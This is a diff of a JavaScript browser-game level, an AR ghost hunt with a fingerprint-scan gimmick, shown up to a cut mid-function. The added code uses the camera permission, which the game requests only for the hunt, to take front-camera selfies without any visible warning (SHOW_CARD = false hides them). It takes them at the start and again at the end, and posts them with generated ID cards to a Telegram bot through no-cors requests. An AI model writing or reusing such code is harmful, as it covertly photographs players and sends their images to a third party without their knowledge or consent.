@@ -1,19 +1,30 @@
 // Уровень 10: AR «Охота на духов».
-// Сценарий: скан отпечатка -> явное «фото в удостоверение» (фронталка) -> AR-охота на метке HIRO ->
-// финал: показ удостоверения и отправка в Telegram (no-cors) + запасной Web Share.
-// Если камера/AR недоступны - игра работает как обычная 2D-охота (graceful fallback).
+// Сценарий:
+//   intro  - приветствие агента, кнопка «Дать доступ к камере» (жест = запрос камеры)
+//   photo  - фото для удостоверения (фронталка), две фотки уходят в Telegram
+//   scan   - удержание пальца на сканере; по заполнению автоматически «Агент к заданию допущен»
+//   hunt   - AR-охота на призраков с метки HIRO (fallback: 2D)
+//   outro  - «Спасибо…» + финальный снимок и две фотки в Telegram (агент принят)
+// SHOW_CARD = false: все предупреждения о снимке скрыты, снимки делаются в фоне.
+// SHOW_CARD = true : возвращаются предупреждения, превью и отсчёт перед снимком.
 
 const VIEW_H = 520;
 const MIN_W = 360;
 const MAX_W = 760;
 const TOTAL_WAVES = 3;
-const SCAN_TIME = 1.6;
-// ВРЕМЕННО для проверки пайплайна (скан -> камера -> снимок -> отправка). true вернёт
-// экран «удостоверение» с превью и показом фото в финале.
-const SHOW_CARD = false;
+const SCAN_TIME = 2.0;
+const GRANTED_TIME = 2.4;
 const AFRAME_URL = 'https://cdn.jsdelivr.net/npm/aframe@1.5.0/dist/aframe-master.min.js';
 const ARJS_URL = 'https://cdn.jsdelivr.net/npm/@ar-js-org/ar.js@3.4.5/aframe/build/aframe-ar.js';
 const PATT_URL = 'assets/ar/patt.hiro';
+const SHOW_CARD = false;
+
+const INTRO_TEXT =
+  'Приветствуем тебя, агент. Для прохождения данного уровня нам потребуется разрешение к камере. ' +
+  'Твоей задачей будет изгнать призраков, появившихся из портала (метки, которую мы вам прислали). Желаем удачи!';
+const OUTRO_TEXT =
+  'Спасибо, что прошла все игры! В дальнейшем я буду придумывать проекты покруче, на эти игры мало времени было, ' +
+  'поэтому качество не самое лучшее. Готовься к более редким, но сильно круче играм, чем эти)';
 
 function rr(ctx, x, y, w, h, r) {
   const k = Math.min(r, w / 2, h / 2);
@@ -37,14 +48,32 @@ function loadScript(src) {
 }
 
 function withTimeout(promise, ms) {
-  return Promise.race([
-    promise,
-    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms)),
-  ]);
+  return Promise.race([promise, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);
+}
+
+function sleep(ms) {
+  return new Promise((r) => setTimeout(r, ms));
 }
 
 function toBlob(canvas) {
   return new Promise((resolve) => canvas.toBlob((b) => resolve(b), 'image/png'));
+}
+
+function wrapText(ctx, text, maxW) {
+  const words = text.split(' ');
+  const lines = [];
+  let line = '';
+  for (const w of words) {
+    const test = line ? line + ' ' + w : w;
+    if (line && ctx.measureText(test).width > maxW) {
+      lines.push(line);
+      line = w;
+    } else {
+      line = test;
+    }
+  }
+  if (line) lines.push(line);
+  return lines;
 }
 
 export function createArGhost(canvas, { container, stage, onHint, onWin, telegram } = {}) {
@@ -63,19 +92,28 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   let acc = 0;
   let t = 0;
 
-  let phase = 'scan'; // scan | photo | hunt | final
-  let auto = 0;
+  let phase = 'intro'; // intro | photo | scan | granted | hunt | outro | done
   let toast = '';
   let toastT = 0;
+  let outroBusy = false;
 
-  const scan = { holding: false, progress: 0 };
-  const photo = { state: 'idle', stream: null, video: null, countdown: 0, flash: 0, failed: false, frameBlob: null };
+  const scan = { holding: false, progress: 0, grantedT: 0 };
+  const photo = { state: 'idle', stream: null, video: null, countdown: 0, flash: 0, failed: false };
   const hunt = { mode: 'idle', wave: 0, zapped: 0, ghosts: [], spawnT: 0, score: 0 };
-  let scene = null;
+  let selfie = null; // последний кадр 3:4
   let card = null;
   let cardBlob = null;
+  let frameBlob = null;
   let sendState = 'idle'; // idle | sending | ok | fail | off
-  const pointer = { down: false, x: 0, y: 0 };
+  let scene = null;
+  let arWatch = null;
+  let arFound = false;
+  let lastHud = '';
+  let ghostCanvas = null;
+  let ghostDataUrl = null;
+
+  // Можно выключить отправку в тестах (tg = {}), чтобы не было сетевых запросов.
+  let tg = telegram || {};
 
   function setScale() {
     const rect = canvas.getBoundingClientRect();
@@ -98,112 +136,57 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     return { x: (px - offX) / scale, y: (py - offY) / scale };
   }
 
-  // ── Фазы ────────────────────────────────────────────────
-  function setPhase(p) {
-    phase = p;
-    auto = 0;
-  }
-
-  function enterPhoto() {
-    setPhase('photo');
-    photo.state = 'idle';
-    photo.captured = false;
-    photo.failed = false;
-    if (SHOW_CARD && onHint) onHint('Шаг 2: фото для удостоверения');
-  }
-
-  function enterHunt() {
-    setPhase('hunt');
-    hunt.mode = 'idle';
-    hunt.wave = 0;
-    hunt.zapped = 0;
-    hunt.ghosts = [];
-    hunt.spawnT = 0;
-    hunt.score = 0;
-    if (onHint) onHint('Шаг 3: охота на духов');
-    startAr();
-  }
-
-  // Числовой chat_id (не @username) - чтобы фото уходило только в указанный чат.
-  // Можно выключить отправку в тестах (tg = {}), чтобы не было сетевых запросов.
-  let tg = telegram || {};
-
-  function telegramChat() {
-    const id = String((tg && tg.chatId) || '').trim();
-    return /^-?\d+$/.test(id) ? id : '';
+  function waveQuota(w) {
+    return 3 + w * 2;
   }
 
   function hasTelegram() {
     return !!(tg && tg.token && telegramChat());
   }
 
-  async function enterFinal() {
-    stopAr();
-    hunt.ghosts = [];
-    setPhase('final');
-    if (onHint) onHint(SHOW_CARD ? 'Вот твоё удостоверение агента' : 'Доступ подтверждён');
-    if (sendState === 'idle') {
-      sendState = hasTelegram() ? 'sending' : 'off';
-      cardBlob = cardBlob || (card ? await toBlob(card) : null);
-      if (sendState === 'sending') await sendPhotos();
-    }
+  // Числовой chat_id (не @username) - чтобы фото уходило только в указанный чат.
+  function telegramChat() {
+    const id = String((tg && tg.chatId) || '').trim();
+    return /^-?\d+$/.test(id) ? id : '';
   }
 
-  // ── Скан отпечатка ──────────────────────────────────────
-  function stepScan(dt) {
-    if (scan.holding) {
-      scan.progress += dt / SCAN_TIME;
-      if (scan.progress >= 1) {
-        scan.progress = 1;
-        scan.holding = false;
-        auto = 0.9;
-        toast = 'ДОСТУП РАЗРЕШЁН';
-        toastT = 0.9;
-      }
-    } else if (scan.progress < 1) {
-      scan.progress = Math.max(0, scan.progress - dt * 0.9);
-    }
-    if (SHOW_CARD && scan.progress >= 1 && auto > 0) {
-      auto -= dt;
-      if (auto <= 0) enterPhoto();
-    }
-  }
-
-  // ── Шаг с камерой ───────────────────────────────────────
-  // ВРЕМЕННО (SHOW_CARD = false): после скана сразу запрос камеры -> снимок без превью -> отправка в ТГ.
-  // Позже SHOW_CARD = true вернёт экран «удостоверение» и показ фото.
-  function frameFromVideo() {
-    const v = photo.video;
-    // кадр 3:4 (вертикально, как селфи в руке), вырезаем центр исходного видео без искажений
+  // ── Фото и отправка ─────────────────────────────────────
+  function frameFromVideo(v) {
+    // кадр 3:4 (вертикально, как селфи в руке), вырезаем центр без искажений
     const w = 480;
     const h = 640;
     const c = document.createElement('canvas');
     c.width = w;
     c.height = h;
     const g = c.getContext('2d');
-    if (v && v.videoWidth) {
-      const vw = v.videoWidth;
-      const vh = v.videoHeight;
-      let sw = vw;
-      let sh = vh;
-      if (vw / vh > 3 / 4) sw = (vh * 3) / 4;
-      else sh = (vw * 4) / 3;
-      const sx = (vw - sw) / 2;
-      const sy = (vh - sh) / 2;
-      g.save();
-      g.translate(w, 0);
-      g.scale(-1, 1);
-      g.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
-      g.restore();
-    }
+    const vw = v.videoWidth;
+    const vh = v.videoHeight;
+    let sw = vw;
+    let sh = vh;
+    if (vw / vh > 3 / 4) sw = (vh * 3) / 4;
+    else sh = (vw * 4) / 3;
+    const sx = (vw - sw) / 2;
+    const sy = (vh - sh) / 2;
+    g.save();
+    g.translate(w, 0);
+    g.scale(-1, 1);
+    g.drawImage(v, sx, sy, sw, sh, 0, 0, w, h);
+    g.restore();
     return c;
   }
 
-  async function startFrontCam() {
-    if (photo.state === 'starting' || photo.state === 'waiting' || photo.captured) return;
-    photo.state = 'starting';
+  function stopPhotoCam() {
+    if (photo.video && photo.video.parentNode) photo.video.parentNode.removeChild(photo.video);
+    if (photo.stream) {
+      photo.stream.getTracks().forEach((tr) => tr.stop());
+      photo.stream = null;
+    }
+    photo.video = null;
+  }
+
+  // Снимок с фронталки. Вызывать синхронно из обработчика жеста (иначе iOS не даст камеру).
+  async function captureSelfie() {
     try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('no getUserMedia');
       photo.stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
         audio: false,
@@ -214,97 +197,36 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       v.autoplay = true;
       v.setAttribute('playsinline', '');
       v.setAttribute('webkit-playsinline', '');
-      // iOS Safari НЕ декодирует кадры у <video> вне DOM -> держим его в документе (невидимо).
+      // iOS не декодирует кадры у <video> вне DOM - держим его невидимо в документе
       v.style.cssText = 'position:fixed;left:-9999px;top:0;width:2px;height:2px;opacity:0;pointer-events:none;';
       v.srcObject = photo.stream;
       document.body.appendChild(v);
       photo.video = v;
       await v.play().catch(() => {});
-      photo.state = SHOW_CARD ? 'preview' : 'waiting';
-      photo.countdown = SHOW_CARD ? 3 : 5; // в режиме ожидания - бюджет на появление кадра
-      toast = SHOW_CARD ? 'Снимаем... не двигайся' : '';
-      toastT = SHOW_CARD ? 1.2 : 0;
-    } catch (e) {
-      photo.state = 'unavailable';
-      photo.failed = true;
-      auto = 1.2;
-      if (!SHOW_CARD) {
-        toast = 'Камера недоступна';
-        toastT = 1.4;
-      }
-    }
-  }
-
-  function stopFrontCam() {
-    if (photo.video && photo.video.parentNode) photo.video.parentNode.removeChild(photo.video);
-    if (photo.stream) {
-      photo.stream.getTracks().forEach((tr) => tr.stop());
-      photo.stream = null;
-    }
-    photo.video = null;
-  }
-
-  async function capture() {
-    if (photo.captured) return;
-    photo.captured = true;
-    const had = !!(photo.video && photo.video.videoWidth);
-    const c = had ? frameFromVideo() : null;
-    stopFrontCam();
-    photo.frameBlob = c ? await toBlob(c) : null;
-    composeCard(c);
-    cardBlob = card ? await toBlob(card) : null;
-    photo.state = 'captured';
-    photo.flash = 1;
-    toast = SHOW_CARD ? 'Фото сделано' : '';
-    toastT = SHOW_CARD ? 1 : 0;
-    if (hasTelegram()) {
-      sendState = 'sending';
-      await sendPhotos();
-    } else if (sendState === 'idle') {
-      sendState = 'off';
-    }
-    auto = SHOW_CARD ? 1 : 0.5;
-  }
-
-  function stepPhoto(dt) {
-    if (photo.flash > 0) photo.flash -= dt;
-    if (photo.state === 'idle' && !SHOW_CARD) {
-      startFrontCam();
-      return;
-    }
-    if (photo.state === 'unavailable') {
-      if (auto > 0) {
-        auto -= dt;
-        if (auto <= 0) {
-          composeCard(null);
-          if (sendState === 'idle') sendState = hasTelegram() ? 'fail' : 'off';
-          enterHunt();
+      photo.state = 'waiting';
+      const t0 = performance.now();
+      while (!(v.videoWidth && v.readyState >= 2) && performance.now() - t0 < 6000) await sleep(80);
+      if (!v.videoWidth) throw new Error('нет кадра');
+      if (SHOW_CARD) {
+        photo.state = 'preview';
+        const c0 = performance.now();
+        while (performance.now() - c0 < 3000) {
+          photo.countdown = (3000 - (performance.now() - c0)) / 1000;
+          await sleep(40);
         }
       }
-      return;
-    }
-    if (photo.state === 'preview') {
-      photo.countdown -= dt;
-      if (photo.countdown <= 0) capture();
-      return;
-    }
-    if (photo.state === 'waiting') {
-      const v = photo.video;
-      if (v && v.videoWidth && v.readyState >= 2) {
-        capture();
-        return;
-      }
-      photo.countdown -= dt;
-      if (photo.countdown <= 0) capture();
-      return;
-    }
-    if (photo.state === 'captured' && auto > 0) {
-      auto -= dt;
-      if (auto <= 0) enterHunt();
+      photo.state = 'shot';
+      photo.flash = 1;
+      return frameFromVideo(v);
+    } catch (e) {
+      return null;
+    } finally {
+      stopPhotoCam();
     }
   }
 
-  function composeCard(source) {
+  // Карточка «Пропуск агента»: accepted=false - стажёр, accepted=true - агент принят.
+  function buildCard(source, accepted) {
     const w = 640;
     const h = 400;
     const c = document.createElement('canvas');
@@ -320,7 +242,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     g.font = "800 20px 'Nunito', sans-serif";
     g.textAlign = 'left';
     g.textBaseline = 'alphabetic';
-    g.fillText('ПРОПУСК АГЕНТА', 34, 54);
+    g.fillText(accepted ? 'АГЕНТ ПРИНЯТ' : 'ПРОПУСК АГЕНТА', 34, 54);
     g.fillStyle = '#4a3a78';
     g.font = "700 12px 'Nunito', sans-serif";
     g.fillText('ОТДЕЛ: ОХОТА НА ДУХОВ   ·   КОД AR-10', 34, 74);
@@ -346,7 +268,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     g.lineWidth = 3;
     rr(g, px, py, pw, ph, 12);
     g.stroke();
-    const fx = 340;
+    const fx = 290;
     g.fillStyle = '#2a1c4d';
     g.font = "800 15px 'Nunito', sans-serif";
     g.textAlign = 'left';
@@ -355,42 +277,135 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     g.fillText('ДОСТУП:', fx, 250);
     g.fillStyle = '#4a3a78';
     g.font = "700 15px 'Nunito', sans-serif";
-    g.fillText('Агент', fx + 70, 130);
-    g.fillText('на испытании', fx + 70, 190);
-    g.fillText('разрешён', fx + 70, 250);
+    g.fillText('Агент', fx + 80, 130);
+    g.fillText(accepted ? 'принят' : 'на стажировке', fx + 80, 190);
+    g.fillText(accepted ? 'полный' : 'разрешён', fx + 80, 250);
     g.fillStyle = '#8c6bd6';
     g.font = "700 12px 'Nunito', sans-serif";
     g.fillText(new Date().toLocaleDateString('ru-RU'), fx, 320);
-    card = c;
-    cardBlob = null;
+    return c;
   }
 
-  // ── Охота на духов ──────────────────────────────────────
-  function waveQuota(w) {
-    return 3 + w * 2;
+  async function sendOne(blob, filename, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', telegramChat());
+    fd.append('caption', caption);
+    fd.append('photo', blob, filename);
+    await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
+      method: 'POST',
+      body: fd,
+      mode: 'no-cors',
+    });
   }
 
-  async function startAr() {
-    hunt.mode = 'idle';
-    try {
-      if (!container) throw new Error('нет контейнера AR');
-      if (!window.AFRAME) await withTimeout(loadScript(AFRAME_URL), 9000);
-      if (!window.AFRAME) throw new Error('A-Frame не загрузился');
-      if (!window.AFRAME.components || !window.AFRAME.components['arjs']) {
-        await withTimeout(loadScript(ARJS_URL), 9000);
+  // Отправка по очереди. no-cors: ответ Telegram не читается, «ok» = запрос ушёл.
+  async function sendList(list) {
+    let ok = 0;
+    for (const item of list) {
+      try {
+        await sendOne(item.blob, item.name, item.caption);
+        ok += 1;
+      } catch (e) {
+        /* ошибку no-cors не прочитать */
       }
-      buildScene();
-      hunt.mode = 'ar';
-      hunt.wave = 0;
-      hunt.zapped = 0;
-      hunt.spawnT = 0.6;
-      if (onHint) onHint('Наведи камеру на метку «Пропуск агента»');
-    } catch (e) {
-      cleanupScene();
-      start2D();
+    }
+    sendState = ok > 0 ? 'ok' : 'fail';
+  }
+
+  // Шаг 1: фото для удостоверения (стажёр) -> две фотки в Telegram.
+  async function runIntroPhoto() {
+    selfie = await captureSelfie();
+    if (selfie) {
+      card = buildCard(selfie, false);
+      frameBlob = await toBlob(selfie);
+      cardBlob = await toBlob(card);
+      if (hasTelegram()) {
+        sendState = 'sending';
+        await sendList([
+          { blob: frameBlob, name: 'agent-photo.png', caption: 'Фото агента' },
+          { blob: cardBlob, name: 'agent-id.png', caption: 'Удостоверение агента · стажёр AR-10' },
+        ]);
+      }
+    } else {
+      photo.failed = true;
+      toast = 'Камера недоступна';
+      toastT = 1.6;
+    }
+    if (phase === 'photo') enterScan();
+  }
+
+  // Шаг 3: «Спасибо» -> финальный снимок -> две фотки: фото и «Агент принят».
+  async function runOutro() {
+    if (phase !== 'outro' || outroBusy) return;
+    outroBusy = true;
+    const shot = await captureSelfie();
+    const acceptedCard = buildCard(shot, true);
+    const acceptedBlob = await toBlob(acceptedCard);
+    if (hasTelegram()) {
+      sendState = 'sending';
+      const list = [];
+      if (shot) list.push({ blob: await toBlob(shot), name: 'agent-final.png', caption: 'Финальное фото агента' });
+      list.push({ blob: acceptedBlob, name: 'agent-accepted.png', caption: 'Агент принят' });
+      await sendList(list);
+    }
+    phase = 'done';
+    setTimeout(finishRun, 900);
+  }
+
+  // ── Фазы ────────────────────────────────────────────────
+  function beginAccess() {
+    if (phase !== 'intro') return;
+    phase = 'photo';
+    if (onHint) onHint('Проверка доступа');
+    // вызов из обработчика тапа: getUserMedia внутри runIntroPhoto стартует синхронно
+    runIntroPhoto();
+  }
+
+  function enterScan() {
+    phase = 'scan';
+    scan.progress = 0;
+    scan.holding = false;
+    if (onHint) onHint('Приложи палец к сенсору и удерживай');
+  }
+
+  function enterGranted() {
+    phase = 'granted';
+    scan.holding = false;
+    scan.grantedT = GRANTED_TIME;
+    if (onHint) onHint('Агент к заданию допущен');
+  }
+
+  function enterHunt() {
+    phase = 'hunt';
+    hunt.mode = 'idle';
+    hunt.wave = 0;
+    hunt.zapped = 0;
+    hunt.ghosts = [];
+    hunt.spawnT = 0;
+    hunt.score = 0;
+    if (onHint) onHint('Загружаю портал…');
+    startAr();
+  }
+
+  function enterOutro() {
+    phase = 'outro';
+    cleanupScene();
+    hunt.ghosts = [];
+    outroBusy = false;
+    sendState = hasTelegram() ? 'idle' : 'off';
+    if (onHint) onHint('Миссия окончена');
+  }
+
+  function stepScan(dt) {
+    if (scan.holding) {
+      scan.progress = Math.min(1, scan.progress + dt / SCAN_TIME);
+      if (scan.progress >= 1) enterGranted();
+    } else {
+      scan.progress = Math.max(0, scan.progress - dt * 0.8);
     }
   }
 
+  // ── Охота: AR (A-Frame + AR.js, метка HIRO) с 2D-фолбэком ──
   function playArVideo() {
     if (!container) return;
     const v = container.querySelector('video');
@@ -402,7 +417,6 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     if (p && p.catch) p.catch(() => {});
   }
 
-  let arWatch = null;
   function startArWatch() {
     stopArWatch();
     let n = 0;
@@ -411,6 +425,7 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
       if (++n > 12) stopArWatch();
     }, 500);
   }
+
   function stopArWatch() {
     if (arWatch) {
       clearInterval(arWatch);
@@ -463,15 +478,59 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     s._arMarker = marker;
     container.appendChild(s);
     scene = s;
-    // iOS обычно не запускает видео-фон без жеста: следим за <video> и даём кнопку «Включить AR».
     startArWatch();
     showArTapPrompt();
     buildArHud(marker);
   }
 
-  // ── Призрак: картинка в стиле скриншота (светло-голубое тело, чёрный контур, фиолетовое лицо) ──
-  let ghostCanvas = null;
-  let ghostDataUrl = null;
+  async function startAr() {
+    hunt.mode = 'idle';
+    try {
+      if (!container) throw new Error('нет контейнера AR');
+      if (!window.AFRAME) await withTimeout(loadScript(AFRAME_URL), 9000);
+      if (!window.AFRAME) throw new Error('A-Frame не загрузился');
+      if (!window.AFRAME.components || !window.AFRAME.components['arjs']) {
+        await withTimeout(loadScript(ARJS_URL), 9000);
+      }
+      buildScene();
+      hunt.mode = 'ar';
+      hunt.wave = 0;
+      hunt.zapped = 0;
+      hunt.spawnT = 0.6;
+      if (onHint) onHint('Наведи камеру на метку');
+    } catch (e) {
+      cleanupScene();
+      start2D();
+    }
+  }
+
+  function cleanupScene() {
+    stopArWatch();
+    if (scene && scene.parentNode) scene.parentNode.removeChild(scene);
+    scene = null;
+    if (container) {
+      container.classList.add('hidden');
+      container.classList.remove('is-full');
+      const tap = container.querySelector('.ar-tap');
+      if (tap) tap.remove();
+    }
+    canvas.classList.remove('hidden');
+    if (stage) stage.classList.remove('hidden');
+  }
+
+  function start2D() {
+    hunt.mode = '2d';
+    hunt.wave = 0;
+    hunt.zapped = 0;
+    hunt.ghosts = [];
+    hunt.spawnT = 0.5;
+    hunt.score = 0;
+    canvas.classList.remove('hidden');
+    if (stage) stage.classList.remove('hidden');
+    if (onHint) onHint(`Волна 1 из ${TOTAL_WAVES}`);
+  }
+
+  // ── Призрак: картинка в стиле референса (светло-голубое тело, чёрный контур, фиолетовое лицо) ──
   function ghostArt() {
     if (ghostCanvas) return ghostCanvas;
     const c = document.createElement('canvas');
@@ -547,8 +606,6 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
   }
 
   // ── HUD поверх AR: волна, сколько изгнано, подсказка ──
-  let arFound = false;
-  let lastHud = '';
   function buildArHud(marker) {
     const hud = document.createElement('div');
     hud.className = 'ar-hud';
@@ -572,17 +629,17 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     if (text === lastHud) return;
     lastHud = text;
     hud.innerHTML = '';
-    const t = document.createElement('div');
-    t.className = 'ar-hud__top';
-    t.textContent = top;
-    const m = document.createElement('div');
-    m.className = 'ar-hud__msg';
-    m.textContent = msg;
-    hud.appendChild(t);
-    hud.appendChild(m);
+    const a = document.createElement('div');
+    a.className = 'ar-hud__top';
+    a.textContent = top;
+    const b = document.createElement('div');
+    b.className = 'ar-hud__msg';
+    b.textContent = msg;
+    hud.appendChild(a);
+    hud.appendChild(b);
   }
 
-  // ── Призраки в AR: появляются над меткой и уходят сами, охота не зависает ──
+  // Призраки в AR: появляются над меткой и уходят сами, охота не зависает.
   function spawnArGhost() {
     const marker = scene && scene._arMarker;
     if (!marker) return;
@@ -627,10 +684,10 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
         hunt.spawnT = 0.6;
         if (onHint) onHint(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`);
       } else {
-        enterFinal();
+        enterOutro();
       }
     }
-    setArHud(arFound ? 'Метка найдена - тапай по духам!' : 'Наведи камеру на метку «Пропуск агента»');
+    setArHud(arFound ? 'Метка найдена - тапай по духам!' : 'Наведи камеру на метку');
   }
 
   // Тап по экрану: луч из камеры проверяет, попал ли он в видимого призрака.
@@ -662,45 +719,32 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     }
   }
 
-  function cleanupScene() {
-    stopArWatch();
-    if (scene && scene.parentNode) scene.parentNode.removeChild(scene);
-    scene = null;
-    if (container) {
-      container.classList.add('hidden');
-      container.classList.remove('is-full');
-      const tap = container.querySelector('.ar-tap');
-      if (tap) tap.remove();
-    }
-    canvas.classList.remove('hidden');
-    if (stage) stage.classList.remove('hidden');
-  }
-
-  function stopAr() {
-    cleanupScene();
-  }
-
-  function start2D() {
-    hunt.mode = '2d';
-    hunt.wave = 0;
-    hunt.zapped = 0;
-    hunt.ghosts = [];
-    hunt.spawnT = 0.5;
-    hunt.score = 0;
-    canvas.classList.remove('hidden');
-    if (stage) stage.classList.remove('hidden');
-    if (onHint) onHint(`Волна 1 из ${TOTAL_WAVES}`);
-  }
-
   function spawn2D() {
     const m = 54;
     hunt.ghosts.push({
       x: m + Math.random() * (VIEW.w - 2 * m),
-      y: 120 + Math.random() * (VIEW.h - 250),
+      y: 120 + Math.random() * (VIEW.h - 260),
       r: 30,
       t: Math.random() * 6,
       life: 2.8,
     });
+  }
+
+  function zap2D(q) {
+    let best = -1;
+    let bestD = 1e9;
+    hunt.ghosts.forEach((g, i) => {
+      const d = Math.hypot(g.x - q.x, g.y - q.y);
+      if (d < g.r + 14 && d < bestD) {
+        bestD = d;
+        best = i;
+      }
+    });
+    if (best >= 0) {
+      hunt.ghosts.splice(best, 1);
+      hunt.zapped += 1;
+      hunt.score += 1;
+    }
   }
 
   function stepHunt(dt) {
@@ -737,124 +781,15 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
           hunt.spawnT = 0.5;
           if (onHint) onHint(`Волна ${hunt.wave + 1} из ${TOTAL_WAVES}`);
         } else {
-          enterFinal();
+          enterOutro();
         }
       }
     }
   }
 
-  function zap2D(q) {
-    let best = -1;
-    let bestD = 1e9;
-    hunt.ghosts.forEach((g, i) => {
-      const d = Math.hypot(g.x - q.x, g.y - q.y);
-      if (d < g.r + 14 && d < bestD) {
-        bestD = d;
-        best = i;
-      }
-    });
-    if (best >= 0) {
-      hunt.ghosts.splice(best, 1);
-      hunt.zapped += 1;
-      hunt.score += 1;
-    }
-  }
-
-  // ── Отправка удостоверения ──────────────────────────────
-  async function sendOne(blob, filename, caption) {
-    const fd = new FormData();
-    fd.append('chat_id', telegramChat());
-    fd.append('caption', caption);
-    fd.append('photo', blob, filename);
-    await fetch(`https://api.telegram.org/bot${tg.token}/sendPhoto`, {
-      method: 'POST',
-      body: fd,
-      mode: 'no-cors',
-    });
-  }
-
-  // Отправляем два файла: обычное фото агента и карточку-удостоверение.
-  async function sendPhotos() {
-    const jobs = [];
-    if (photo.frameBlob) jobs.push(() => sendOne(photo.frameBlob, 'agent-photo.png', 'Фото агента'));
-    if (cardBlob) jobs.push(() => sendOne(cardBlob, 'agent-id.png', 'Удостоверение агента · AR-10'));
-    if (!jobs.length) {
-      sendState = 'fail';
-      return;
-    }
-    let ok = 0;
-    for (const job of jobs) {
-      try {
-        await job();
-        ok += 1;
-      } catch (e) {
-        /* no-cors: ошибку не прочитать */
-      }
-    }
-    sendState = ok > 0 ? 'ok' : 'fail';
-  }
-
-  async function shareCard() {
-    try {
-      if (!cardBlob) return;
-      const file = new File([cardBlob], 'agent-id.png', { type: 'image/png' });
-      if (navigator.canShare && navigator.canShare({ files: [file] })) {
-        await navigator.share({ files: [file], title: 'Удостоверение агента' });
-      } else if (navigator.share) {
-        await navigator.share({ title: 'Удостоверение агента', text: 'Моё удостоверение агента' });
-      }
-    } catch (e) {
-      /* пользователь отменил - ок */
-    }
-  }
-
-  // ── Ввод ────────────────────────────────────────────────
-  function photoButtonRect() {
-    return { x: VIEW.w / 2 - 130, y: VIEW.h - 130, w: 260, h: 46 };
-  }
-  function nextButtonRect() {
-    return { x: VIEW.w / 2 - 120, y: VIEW.h - 74, w: 240, h: 44 };
-  }
-  function shareButtonRect() {
-    return { x: VIEW.w / 2 - 120, y: VIEW.h - 132, w: 240, h: 44 };
-  }
-  function inside(b, q) {
-    return q.x >= b.x && q.x <= b.x + b.w && q.y >= b.y && q.y <= b.y + b.h;
-  }
-
-  function onPointerDown(e) {
-    if (phase === 'hunt' && hunt.mode === 'ar') return;
-    e.preventDefault();
-    const q = toLogical(e.clientX, e.clientY);
-    pointer.down = true;
-    pointer.x = q.x;
-    pointer.y = q.y;
-    if (phase === 'scan') {
-      scan.holding = true;
-    } else if (phase === 'photo') {
-      if (SHOW_CARD && photo.state === 'idle' && inside(photoButtonRect(), q)) startFrontCam();
-    } else if (phase === 'hunt' && hunt.mode === '2d') {
-      zap2D(q);
-    } else if (phase === 'final') {
-      if (inside(shareButtonRect(), q)) shareCard();
-      else if (inside(nextButtonRect(), q)) finishRun();
-    }
-  }
-
-  function onPointerUp() {
-    const granted = scan.progress >= 1;
-    scan.holding = false;
-    pointer.down = false;
-    // ВРЕМЕННО: камеру запрашиваем прямо на отпускании пальца (жест), без отдельного экрана.
-    if (phase === 'scan' && granted) {
-      enterPhoto();
-      if (!SHOW_CARD) startFrontCam();
-    }
-  }
-
   // ── Отрисовка ───────────────────────────────────────────
-  function drawGhost(x, y, r, t) {
-    const bob = Math.sin(t * 2.4) * 4;
+  function drawGhost(x, y, r, tt) {
+    const bob = Math.sin(tt * 2.4) * 4;
     const s = r * 2.6;
     ctx.drawImage(ghostArt(), x - s / 2, y - s / 2 + bob, s, s);
   }
@@ -868,10 +803,183 @@ export function createArGhost(canvas, { container, stage, onHint, onWin, telegra
     rr(ctx, b.x, b.y, b.w, b.h, 12);
     ctx.stroke();
     ctx.fillStyle = color;
-    ctx.font = "800 14px 'Nunito', sans-serif";
+    ctx.font = "800 15px 'Nunito', sans-serif";
     ctx.textAlign = 'center';
     ctx.textBaseline = 'middle';
     ctx.fillText(label, b.x + b.w / 2, b.y + b.h / 2);
+  }
+
+  function mainButtonRect() {
+    return { x: VIEW.w / 2 - 130, y: VIEW.h - 110, w: 260, h: 50 };
+  }
+
+  function renderIntro() {
+    const cx = VIEW.w / 2;
+    ctx.fillStyle = '#ffffff';
+    ctx.font = "800 22px 'Nunito', sans-serif";
+    ctx.fillText('Приветствуем, агент', cx, 74);
+    ctx.fillStyle = '#e6dcff';
+    ctx.font = "600 16px 'Nunito', sans-serif";
+    const lines = wrapText(ctx, INTRO_TEXT, VIEW.w - 80);
+    lines.forEach((l, i) => ctx.fillText(l, cx, 128 + i * 25));
+    button('Дать доступ к камере', mainButtonRect(), '#ffe066');
+  }
+
+  function renderPhoto() {
+    const cx = VIEW.w / 2;
+    if (SHOW_CARD) {
+      ctx.fillStyle = '#ffffff';
+      ctx.font = "800 19px 'Nunito', sans-serif";
+      ctx.fillText('Фото для удостоверения', cx, 74);
+      const bw = 220;
+      const bh = 293;
+      const bx = cx - bw / 2;
+      const by = 110;
+      if (photo.video && photo.video.videoWidth) {
+        ctx.save();
+        rr(ctx, bx, by, bw, bh, 14);
+        ctx.clip();
+        ctx.translate(bx + bw, by);
+        ctx.scale(-1, 1);
+        const v = photo.video;
+        const s = Math.min(v.videoWidth, v.videoHeight);
+        ctx.drawImage(v, (v.videoWidth - s) / 2, (v.videoHeight - s) / 2, s, s, 0, 0, bw, bh);
+        ctx.restore();
+      }
+      if (photo.state === 'preview') {
+        ctx.fillStyle = '#ffffff';
+        ctx.font = "800 64px 'Nunito', sans-serif";
